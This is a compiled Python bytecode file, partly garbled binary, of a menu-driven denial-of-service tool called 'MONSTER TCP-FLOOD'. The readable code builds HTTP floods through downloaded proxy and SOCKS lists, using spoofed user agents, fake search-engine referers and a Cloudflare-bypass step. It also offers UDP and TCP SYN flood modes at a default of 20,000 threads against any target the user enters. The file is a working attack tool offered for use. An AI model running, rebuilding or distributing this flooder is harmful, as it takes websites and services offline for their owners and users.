a
    o?�cر  �                   @   s�  d dl Z d dlZz,d dlZd dlZd dlZd dlZd dlZW nF   ej�d�r\e �	d� n"ej�d�rte �	d� n
e �	d� Y n0 d dl
Z
d dlZd dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dl m	Z	 d dlmZ d d	lmZ e��  e��  e �	d
� dd� Zed� e�d� e�  ed� e�d� e�  ed� e�d� e�  ed� e�d� e�  g d�Zg d�Zg d�aej�d� ddgZ dd� Z!dd� Z"dd� Z#dd � Z$d!d"� Z%d#d$� Z&e'd �a(d%d&� Z)d'd(� Z*d)d*� Z+d+d,� Z,d-d.� Z-d/d0� Z.G d1d2� d2ej/�Z0G d3d4� d4ej/�Z1G d5d6� d6ej/�Z2G d7d8� d8ej/�Z3G d9d:� d:ej/�Z4G d;d<� d<ej/�Z5d=d>� Z6G d?d@� d@ej/�Z7e8dAk�r�e"�  dS )B�    N�linuxz9pip3 install pysocks requests wget cfscrape urllib3 scapy�freebsdz8pip install pysocks requests wget cfscrape urllib3 scapy)�sleep)�system)�stdout��randint�clsc                   C   s   t �t jdkrdnd� d S )N�ntr	   �clear)�osr   �name� r   r   �/root/hmt.pyr      s    r   z`
  / **/|        
  | == /        
   |  |         
   |  |         
   |  /         
    |/  
 g333333�?za

  / **/|        
  | == /        
   |  |         
   |  |         
   |  /         
    |/  
 zi


  / **/|        
  | == /        
   |  |   
   |  |         
   |  /         
    |/               
 a  



  _.-^^---....,,--       
_--                  --_  
<                        >)
|                         | 
\._                   _./  
 ```--. . , ; .--'''       
       | |   |             
    .-=||  | |=-.   
    `-=#$%&%$#=-'   
       | ;  :|     
_____.,-#%&$@%#&#~,._____
 g�������?)�zZMozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1zWMozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1zBMozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1z?Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0zUMozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1zcMozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2z�Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0zGMozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0zCMozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zOMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zjMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6zLMozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1zJMozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1zRMozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4prezJMozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2zJMozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1zbMozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3z`Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0zFMozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)zPMozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016zwMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10zsMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7z\Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18z\Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10zuMozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)zsMozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9zvMozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8zqMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)zwMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )zrMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1zuMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14z]Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5zbMozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2prezoMozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12zsMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20z>Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0azMMozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2zCMozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0zaMozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34z�Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1z�Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2zNMozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1z[Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1zVMozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1zCMozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 zDMozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zJMozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6prez@Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0zTMozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2z@Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0z@Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24zeMozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1zeMozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5zUMozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2prezHMozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1zYMozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2zFMozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zLMozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1prezPMozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0zFMozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1zoMozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0zRMozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8zmMozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0zNMozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15z8Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) GeckoztMozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16zMMozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025zTMozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1zMMozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020zbMozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1zXMozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)zlMozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncherzrMozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 DebianzkMozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8z�Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15zJMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8zCMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7zEMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8zDMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14ziMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)zYMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6zWMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)ziMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11zWMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)zVMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0zgMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2zCMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330zXMozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)zcMozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8znMozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0z`Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)�mMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9�pMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15�mMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7�xMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0zWMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8zVMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12zhMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5zYMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9zjMozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12zbMozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0zUMozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15zmMozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0zmMozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3zNMozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5zTMozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8zQMozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3zUMozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6r   r   r   r   z�Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNz�Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CNz�Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNz�Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNa   Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CNz�Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN)z,http://help.baidu.com/searchResult?keywords=zhttp://www.bing.com/search?q=z'https://www.yandex.com/yandsearch?text=zhttps://duckduckgo.com/?q=zhttp://www.ask.com/web?q=z#http://search.aol.com/aol/search?q=z7https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=z-https://drive.google.com/viewerng/viewer?url=z+http://validator.w3.org/feed/check.cgi?url=z)http://host-tracker.com/check_page/?furl=zMhttp://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=z1http://jigsaw.w3.org/css-validator/validator?uri=z!https://add.my.yahoo.com/rss?url=zhttp://www.google.com/?q=z)http://www.usatoday.com/search/results?q=z(http://engadget.search.aol.com/search?q=z+https://steamcommunity.com/market/search?q=zhttp://filehippo.com/search?q=z<http://www.topsiteminecraft.com/site/pinterest.com/search?q=z%http://eu.battle.net/wow/en/search?q=)z�Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
z Accept-Encoding: gzip, deflate
zAAccept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
z�Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Charset: iso-8859-1
Accept-Encoding: gzip
z�Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Charset: iso-8859-1
z�Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
Accept-Charset: utf-8, iso-8859-1;q=0.5
z�Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*
Accept-Language: en-US,en;q=0.5
z�Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Encoding: gzip
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
aZ  Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.5
Accept-Charset: utf-8, iso-8859-1;q=0.5
,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
Accept-Language: en-US,en;q=0.5
z\Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
z(Accept: text/html, application/xhtml+xmlz!Accept-Language: en-US,en;q=0.5
zyAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
zJAccept: text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Charset: iso-8859-1
z         ]2;MONSTER TCP-FLOODzpornhub.comzanonboot.pwc                   C   s:  t j�d�rt�d� n0t j�d�r0t�d� nt�t�g d��d � t�  td� z tdt	t
� d t	t� � W n   Y n0 ztd	t	t� � W n   Y n0 ztd
t	t� � W n   Y n0 ztdt	t� � W n   Y n0 ztdttt��� � � W n   Y n0 ztdt	t� � W n   Y n0 d S )Nr   r   r   )�a�b�c�dz admin : Ha Minh Trietu�   
╔╦╗┌─┐┌┐┌┌─┐┌┬┐┌─┐┬─┐
║║║│ ││││└─┐ │ ├┤ ├┬┘
╩ ╩└─┘┘└┘└─┘ ┴ └─┘┴└─        Owner: Ha Minh Trietz
[*] Target : �:z[*] Method : z[*] Mode   : z[*] Bypass : vz[*] Proxies: %sz[*] Threads: )�sys�platform�
startswithr   r   �random�choicer   �print�str�url_main�port�name_method_attack�filenam2�method_pass_cf�len�open�out_file�	readlines�threadsr   r   r   r   �logo�   s>     r*   c                  C   s�  t j�d�rn>t j�d�rn0d} tj�| �sLtd� t�d�}| t�	d� t
�  td��� atdkrlt�  taz`td	 td
  td  td  dkr�dt an.td	 td
  td  td  dkr�ndt aW n   td� t�  Y n0 t
�  z,t�dd��dd��d�d	 �d�d	 aW n*   t�dd��dd��d�d	 aY n0 ttv �rrtd� td� dadat�  t�t�at�  t
�  t�  d S )Nr   r   z C:/Program Files/nodejs/node.exez[!] Download NodeJs.... [!]z6https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msiznode-v12.13.0-x64.msiz
[*] Target [URL/IP]: � r   �   �   �   zwww.zhttp://�httpz[!] You Mistyped, Try Again [!]zhttps://�/r   u/   
[X] ERROR: site vui lòng nhập lại web !!!�   )r   r   r   r   �path�isfiler   �wgetZdownloadr   r*   �input�strip�url�	start_urlr    �replace�split�host_url�black_listsr   �socketZgethostbyname�host_ip�
start_port�choice_method_attack)r2   Zdownr   r   r   r8     sN    

$
$,$

r8   c                   C   sT   t d� ttd��atdkrHdtv r6td�at d� qPtd�at d� ntt�ad S )	N�-----------------------------z[*] Port [80/443]: r+   �httpsi�  z[!] Selected Port = 443 [!]�P   z[!] Selected Port = 80 [!])r   r   r5   r!   r7   �intr   r   r   r   r?   3  s    

r?   c                  C   s�   t d� tj�d�rn(tj�d�r$ntd�D ]} t d|  � q,ttdtt� d tt� d ��a	t	d	krvtt�d
 a	t
t	��� at�  t�  d S )NrA   r   r   z*.txtz|_--> z[+] z [z.txt]: r+   �.txt)r   r   r   r   �globr   r5   r#   �filenam1r'   r&   r(   �proxiesr*   �
numthreads)�filer   r   r   �proxies_listA  s    $rK   c                  C   sP   t t�d attd�} t�t�}| �|j� | �	�  tt��
� at�  t�  d S )NrE   �wb)r   rG   r'   r&   �requests�get�urlproxy�write�content�closer(   rH   r*   rI   )�fZr1r   r   r   �proxygetS  s    

rT   c                   C   s@  t d� td�atdkr,dat�  t�  �ntdkrNdadadat�  t�  n�tdks^td	krxdad
adat�  t�  n�tdkr�t d� t d� t d� datd�atd	ks�tdkr�t d� dant d� dat�  t	�  n`tdkr�dat�  t�  nFtdk�rdat�  t�  n*tdk�r.dat�  t�  nt d� t
�  d S )Na�  
[+]=====[ Layer 7 ]=====[+]=======[ Layer 4 ]=======[+]
 @ 0: Home                        @ 5: UDP-FLOOD     #
 @ 1: Proxy                       @ 6: TCP-SYN       #
 @ 2: Socks                       @ 7: LOADING....   # 
 @ 3: JS-Normal                   @ 8: LOADING....   # 
 @ 4: Raw-DoS                     @ 9: LOADING....   #
[+]=================================================[+]
z[*] ATTACK TYPE [0-6]: �0�Home�1�proxy�Proxy�2r+   �socks�Socks�3rA   z|_--> 1: Method Bypass v1z|_--> 2: Method Bypass v2z	JS-Bypassz[?] Method [1/2]: z5[!] Selected Method Bypass JS v1 [Not yet Update....]z [!] Selected Method Bypass JS v2�4zRaw-DoS�5z	UDP-FLOOD�6zTCP-SYNz [!] You mistyped, try again [!]
)r   r5   �choice_moder#   r*   rI   rG   �choice_down_proxiesr$   �pass_cf�
start_moder   r   r   r   rd   _  sZ    	


rd   c                   C   s�   dt v rdt_z@tdkr(t�t �\aant�� atj	t dd�a
td� t�  W nP   td7 atdtt� d	 � td
kr�t�d� td� t�  nt�  Y n0 d S )NrB   z0TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384rW   �   �Ztimeoutz[!] Bypass Has Been Completed!r,   z[!] Bypassing Again... [�]�   r	   z3[!] ERROR BYPASS
[!]Please choose another attack[!])r7   �cfscrapeZDEFAULT_CIPHERSr$   Zget_cookie_string�cookie�user�create_scraper�scraperrN   �sosor   rI   �error_cfr   r   r   rd   rc   r   r   r   r   rc   �  s"    

rc   c                   C   sv   t d� t d� t d� td�atdks0tdkrBdat d� dan$td	krXd
at d� nt d� t�  t�  t�  d S )NrA   z|_--> 1: Request [  Normal  ]z|_--> 2: Request [  Strong  ]z[!] Choose attack [1/2]: rW   r+   ZNormalz[!] Request Normal OnrZ   ZSpamz[!] Request Strong Onz'[!] Wrong command please try again [!]
)r   r5   �method_attackr"   r@   r*   rd   r   r   r   r   r@   �  s    
r@   c                  C   s�   t dtt� d �} | dks$| dkrztd� td� td� t d�atd	kr`td
krZdaqrdantd
krndandat�  ntdtt� d � t�  d S )Nz[?] Get New List z [Y/N]: �y�YrA   z|_--> 1: Server proxyz"|_--> 2: Server proxy/socks5/sock4z[?] Server Get [1/2]: rX   rW   z4https://www.proxy-list.download/api/v1/get?type=httpzqhttps://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes&anonymity=allz6https://www.proxy-list.download/api/v1/get?type=socks5zshttps://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=allu/   [!] Đã chọn Không Nhận danh sách mới z [!])	r5   r   r#   r   Zsel_prra   rO   rT   rK   )Zchoice4r   r   r   rb   �  s     rb   c                   C   sX   zt d� ttd��aW n. tyF   td�at dtt� d � Y n0 t�  t�  d S )NrA   z[*] Threads [20000]: � N  u   [!] Chủ đề đã chọn z [!]
)r   rD   r5   r)   �
ValueErrorr   r*   �beginr   r   r   r   rI   �  s    rI   c                  C   sZ   t d�} | dkrNdtv s0dtv s0dtv s0dtv r@td� td� t�  t�  nt��  d S )	Nu3   =*= Nhấn "Enter" để bắt đầu tấn công: r+   ZeduZvnZhentaiZpornuF   [+] Admin: ko chịu trách nhiệm với những j bạn gây ra !!!!r.   )r5   r7   r   r   �attackr   �exit)Zchoice6r   r   r   ru   �  s     ru   c                   C   sr  t d�at d�at d�at d�adadadatdkrVt	t
�D ]attd ���  q<�ntdkr~t	t
�D ]attd ���  qfn�td	kr�t	t
�D ]attd ���  q�n�td
kr�tdkr�t	t
�D ]attd ���  q�nt	t
�D ]attd ���  q�nxtdk�r"t	t
�D ]attd ���  �qnLtdk�rDt	t
�D ]at�  �q4n*tdk�rnt	t
�D ]attd ���  �qVd S )Nr   �d   zConnection: Keep-Alive
z1Content-Type: application/x-www-form-urlencoded
z,Content-Length: 0 
Connection: Keep-Alive
rU   r,   rW   rZ   r]   r^   r_   r`   )rD   �x�error�req_code�multiple�
connectionrQ   �lengthra   �ranger)   rV   �startrY   r\   r$   �JSv1�JSv2�raw_dos�udpflood�synfloodr   r   r   r   rv   �  s>    


